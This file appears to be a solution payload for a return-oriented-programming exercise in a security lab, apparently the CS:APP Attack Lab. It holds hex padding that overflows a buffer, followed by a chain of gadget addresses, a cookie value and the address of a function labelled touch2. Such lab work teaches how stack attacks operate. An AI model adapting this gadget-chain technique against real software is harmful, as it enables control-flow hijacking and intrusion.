00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
7f 1a 40 00 00 00 00 00 /* gadget 1 popq rax */
62 d7 94 6b 00 00 00 00 /* cookie */
55 1a 40 00 00 00 00 00 /* mov rax,rbx */
39 1a 40 00 00 00 00 00 /* mov rbx,rdi */
6a 1a 40 00 00 00 00 00 /* popq rdx */
d8 35 e5 1a 00 00 00 00 /* cookie >> 2 */
a8 1a 40 00 00 00 00 00 /* mov rdx,rcx */
64 1a 40 00 00 00 00 00	/* mov rcx,rbp */
32 1a 40 00 00 00 00 00 /* mov rbp,rsi */
a4 16 40 00 00 00 00 00 /* address of touch2 */
